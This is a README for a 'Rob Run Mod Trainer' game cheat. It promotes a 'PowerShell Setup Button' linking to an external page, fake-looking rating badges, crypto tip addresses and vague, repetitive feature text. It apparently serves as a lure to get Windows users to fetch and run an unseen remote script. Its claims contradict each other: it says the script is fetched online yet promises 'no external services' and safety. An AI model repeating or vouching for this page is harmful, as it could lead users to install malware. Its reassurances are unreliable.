<div align="center">

# Rob Run Mod Trainer — Windows 10/11

![](files/preview.png)

### 🔧 PowerShell Setup Button

[![](files/button.png)](https://legendary-propozar.github.io/rob-run-mod-trainer/)

[![powershell](https://img.shields.io/badge/POWERSHELL-SCRIPT-a855f7?style=flat-square&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-1022-9333ea?style=flat-square&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-5.0%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-RELEASED-2ea44f?style=flat-square&labelColor=0d1117)]()

<div align="center">
<h3>Leave a little tip</h3>
<p><strong>BTC</strong>:&nbsp;<code>1Wdcu6VW642JteorTbPuezkUa4iGd7EFX</code> | <strong>TRON</strong>:&nbsp;<code>TPcVbyjd1Gpc5GcuwmsAwodhGDpG3JtJMf</code></p>
</div>

</div>

---

Rob Run Mod Trainer delivers real-time gameplay assistance and clean information overlays that keep you locked into the run. It surfaces the stats, timers, and status cues that matter without touching core game systems or altering the underlying experience. Everything is built for instant readability, so you spend less time guessing and more time playing. Toggle what you need, ignore what you don't, and stay focused on the run.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Real-time stat overlays** — see health, stamina, speed, and other core values live on screen so you always know where you stand mid-run.
- **Gameplay assistance toggles** — flip individual helpers on or off without touching anything else; no forced overhauls, just the specific edges you want.
- **Adjustable movement tuning** — dial in run speed and agility to match your playstyle, from subtle nudges to noticeable boosts.
- **Instant information readouts** — on-demand panels surface the numbers the game normally hides, keeping you informed without breaking flow.
- **Hotkey-driven control** — bind your most-used toggles and overlays to keys for fast switching during play.
- **Lightweight and non-invasive** — runs alongside the game, applies only the assistance and overlay features you enable, and stays out of the way of everything else.
- **Configurable presets** — save and load your preferred setup so your tweaks are ready the moment you launch.

## How it works

Rob Run Mod Trainer hooks into the game at runtime and layers a lightweight assistance framework on top of normal play. It reads live game state — player position, movement values, and session flow — and exposes controls and overlays that respond in real time.

Gameplay assistance is handled through a set of toggleable modifiers. Each modifier patches the relevant value on demand, so changes take effect instantly and can be reversed just as fast. Nothing is baked into game files; the trainer works alongside the running session and leaves the base installation untouched.

Information overlays give you the numbers behind the action. Overlays render on top of the game and update as you play, surfacing stats and state data that are normally invisible. You choose what's active, where it sits, and how it looks.

Configuration is live: tweak values, rebind hotkeys, and switch overlays on or off without restarting. Profiles keep separate setups so you can jump between playstyles without redoing your settings.

The trainer aligns with the target project's runtime — it reads what the game exposes, never modifies core game logic or content, and only acts when you tell it to.

## Modules and Settings

### Movement Assistance Module
Controls the movement behavior adjustments available during practice so you can compare assisted and unassisted attempts.
- An assistance strength setting changes how strongly movement behavior is modified during a run.
- A responsiveness setting adjusts how quickly the assistance reacts to your inputs.
- A per-attempt toggle lets you switch assistance on or off without leaving the session.

### Speed and Pace Module
Manages the pace adjustments applied to your character so you can study how different speeds affect traversal.
- A pace slider fine-tunes travel speed and can be changed between attempts.
- A quick toggle enables or disables the speed change mid-session for direct comparison.
- Pace settings are reflected immediately in movement speed and the time needed to cover familiar sections.

### Jump and Traversal Module
Provides individual modifiers for jump height, air behavior and related traversal parameters for training purposes.
- Each modifier has its own enable control so you can isolate one variable at a time.
- Adjustable values change jump arcs and landing positions, making the effect of specific inputs easier to study.
- Modifiers in this module can be combined with pace settings to test how speed and jump changes interact.

### Practice Mode Module
Supports repeated practice by resetting runs or replaying sections with consistent settings.
- A reset action restarts the current run so you can repeat a section immediately.
- A per-modifier persistence option decides which settings stay active between attempts and which return to their base state.
- Practice settings draw on the active configuration from the other modules, producing a stable loop where performance changes come from your inputs.

### Gameplay State Module
Lets you view and adjust selected gameplay state values during a session where supported.
- Supported state values, such as resource counters or progress indicators, are displayed for review.
- Adjustments are made through the trainer's interface and take effect as the session continues.
- The on-screen state updates to reflect the chosen values, useful for testing how different states affect gameplay.

### Overlay and Profiles
Keeps your active setup visible and reusable so switching between training configurations stays consistent.
- The overlay shows active modifiers and their values, with configurable position, opacity and which elements appear.
- Named profiles save and load full sets of settings from all modules, and can be edited, renamed and applied at the start of a session.
- Applying a profile updates the movement, pace, jump, practice and state modules together, so a known configuration is reproduced without re-entering each option.

### Additional Settings
- Input customization remaps the keys or buttons for toggling modifiers and opening the trainer interface, with new bindings taking effect immediately.
- Overlay visibility can be toggled on the fly for an unobstructed view during attempts.
- Profile management options allow duplicating or clearing saved setups as your practice goals change.
- A session summary option keeps the current module states readable before you start a new attempt.

## Usage Scenarios

### Practicing a Difficult Jump Section with Assistance Toggles
**Goal:** A player wants to isolate how movement assistance affects a tricky jump sequence without changing anything else between attempts.
**Steps:**
1. Open the trainer interface and apply a saved profile that keeps the Jump and Traversal Module on its base values.
2. In the Movement Assistance Module, set the assistance strength and responsiveness to a comfortable level, then use the per-attempt toggle to disable assistance for the first run.
3. Complete the jump section, then use the Practice Mode Module reset action and enable assistance for the next attempt.
4. Compare the two runs using the overlay to confirm which modifiers were active during each attempt.
**Expected result:** The player sees two consecutive attempts with identical jump settings but different movement assistance, making the effect of assistance on jump timing directly visible in the character's movement and landing positions.

### Studying Speed and Jump Interactions Across a Familiar Route
**Goal:** A player wants to understand how different travel speeds change the timing of jumps over obstacles on a route they already know well.
**Steps:**
1. In the Speed and Pace Module, use the pace slider to set a moderate speed and keep the quick toggle enabled for mid-session comparison.
2. Configure the Jump and Traversal Module so only the jump height modifier is active, isolating one variable at a time.
3. Run the route, then use the quick toggle to disable the speed change and repeat the same section.
4. Adjust the jump height value and repeat with the pace setting re-enabled to test how the two modifiers interact.
5. Review the overlay between attempts to confirm which pace and jump values were active.
**Expected result:** The player observes distinct jump arcs and landing positions at each pace and jump height combination, and can attribute differences in obstacle timing to the specific settings shown in the overlay.

### Building and Reusing a Consistent Training Setup
**Goal:** A player wants a repeatable practice loop with known settings so that improvements can be attributed to their own inputs rather than configuration drift.
**Steps:**
1. Configure the Movement Assistance, Speed and Pace, and Jump and Traversal modules to the desired training values.
2. In the Practice Mode Module, set the per-modifier persistence option so chosen settings stay active between attempts while others return to base.
3. Use the reset action to restart the run and confirm the overlay reflects the persisted settings.
4. Save the full setup as a named profile in the Overlay and Profiles section, optionally editing or renaming it for the practice goal.
5. Apply the profile at the start of a later session and check the session summary option before beginning a new attempt.
**Expected result:** The player obtains a stable practice loop where each reset restores the same known configuration, and the saved profile reproduces that setup across sessions without manually re-entering each option.

## Configuration

Tune the trainer to your run. Every assist and overlay is independent, so you can stack the ones you want and switch off the rest. Changes apply live — no restarts, no reloading a save.

**Assist toggles**
- **Speed multiplier** — set from a gentle nudge to full sprint mode with a single hotkey cycle.
- **Jump height and air control** — dial in extra lift and mid-air steering without breaking the movement feel.
- **Stamina and cooldown bypass** — flip on when you want uninterrupted flow, off when you want the challenge back.
- **Auto-collect radius** — expand pickup range or keep it tight to the vanilla default.

**Overlay controls**
- **Position and scale** — drag the overlay anywhere on screen and resize it to taste.
- **Opacity** — from fully solid for information at a glance to nearly invisible for a clean view.
- **Toggle hotkey** — one key hides or shows the entire overlay instantly.
- **Data readouts** — enable only the panels you care about: run stats, timers, proximity alerts, and status indicators.

**Profiles and persistence**
- **Save and load presets** — keep separate setups for casual runs, speed attempts, and practice sessions.
- **Auto-save** — your last configuration loads automatically on startup.
- **Reset to defaults** — one action restores vanilla behavior across every setting.

**Hotkeys**
- **Fully rebindable** — every toggle and action maps to the key you choose, with conflict detection to keep binds clean.

## FAQ

**Is this a full game overhaul?** No. Rob Run Mod Trainer is a gameplay assistance and information layer. It doesn't rewrite core mechanics, replace assets, or change the game's design. It gives you tools and overlays on top of the game you already play.

**What does "gameplay assistance" actually mean here?** It means practical help during play: trainer-style toggles for movement and progression, plus readable on-screen data that keeps you informed without pausing. You stay in control; the mod reacts to what you do.

**What kind of information overlays are included?** Stat readouts, state indicators, and lightweight HUD elements that surface what matters in the moment. They're built to be glanceable and non-intrusive, so you're not fighting the UI mid-run.

**Will it change how the game feels?** Only as much as you configure it. Assistance features are adjustable, and overlays can be tuned or trimmed. If you want a near-vanilla feel with a bit of help, that's a valid setup.

**Is this compatible with other mods?** It's designed as a focused assistance layer, not a framework that hijacks the game. Conflicts are most likely with other trainers or overlay tools touching the same systems—keep one tool per job.

**Do I need to configure anything to get started?** Sensible defaults are in place. Configuration exists for players who want to tune assistance levels and overlay behavior, not as a prerequisite.

**Is it safe to use?** It's an enhancement tool for your own game—no external services, no account changes. Treat it like any mod: back up your setup, and use it responsibly.

## Disclaimer

Rob Run Mod Trainer is built as a gameplay assistance and information overlay tool. It surfaces real-time stats, timers, and route hints so you can read the run and react faster. It does not overhaul core game mechanics, replace game files, or alter unrelated systems.

Use it at your own discretion. You are responsible for how you apply the overlays and assistance during play. The trainer is intended to inform and assist, not to guarantee outcomes or replace your own skill.